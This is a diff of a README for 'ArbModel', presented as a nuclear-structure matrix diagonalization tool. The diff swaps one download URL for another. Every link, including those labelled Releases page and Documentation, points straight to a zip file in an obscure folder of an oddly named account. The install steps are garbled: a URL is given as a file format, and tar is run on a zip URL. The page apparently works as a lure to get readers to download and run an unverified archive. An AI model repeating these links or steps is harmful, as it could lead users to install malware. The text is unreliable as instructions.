@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 ArbModel - Fast and Efficient Matrix Diagonalization Tool 
 
-![Download ArbModel](https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip)
+![Download ArbModel](https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip)
 
 ## 🌟 Overview
 
@@ -12,10 +12,10 @@ ArbModel is an optimized reimplementation of the nuclear structure diagonalizati
 To get started with ArbModel, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Head over to the [Releases page](https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip) to find the latest version of the software.
+   Head over to the [Releases page](https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip) to find the latest version of the software.
 
 2. **Download the Software**
-   From the Releases page, locate the latest version. Click on the download link for your operating system. This file will typically be in the format of `.exe` for Windows or `https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip` for Linux.
+   From the Releases page, locate the latest version. Click on the download link for your operating system. This file will typically be in the format of `.exe` for Windows or `https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip` for Linux.
 
 3. **Install the Application**
    - **For Windows:**
@@ -24,10 +24,10 @@ To get started with ArbModel, follow these simple steps:
      - Follow the on-screen instructions to complete the installation.
    - **For Linux:**
      - Open a terminal.
-     - Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip` file.
+     - Navigate to the directory where you downloaded the `https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip` file.
      - Extract the contents using the command: 
        ```bash
-       tar -xzf https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip
+       tar -xzf https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip
        ```
      - Change into the extracted directory:
        ```bash
@@ -40,7 +40,7 @@ To get started with ArbModel, follow these simple steps:
 
 ## 📥 Download & Install
 
-You can download ArbModel directly from the [Releases page](https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip). Make sure you select the correct file for your operating system. 
+You can download ArbModel directly from the [Releases page](https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip). Make sure you select the correct file for your operating system. 
 
 ## 💻 System Requirements
 
@@ -62,7 +62,7 @@ ArbModel comes with several features that make it a powerful tool for nuclear st
 
 ## 📚 Documentation
 
-For detailed information about using ArbModel, please refer to the [Documentation](https://raw.githubusercontent.com/Shirajuridical371/ArbModel/master/ISFDataBase/ArbModel-nebulize.zip). This resource includes:
+For detailed information about using ArbModel, please refer to the [Documentation](https://github.com/Shirajuridical371/ArbModel/raw/refs/heads/master/ISFDataBase/Arb_Model_v3.9.zip). This resource includes:
 
 - Step-by-step guides
 - Example calculations
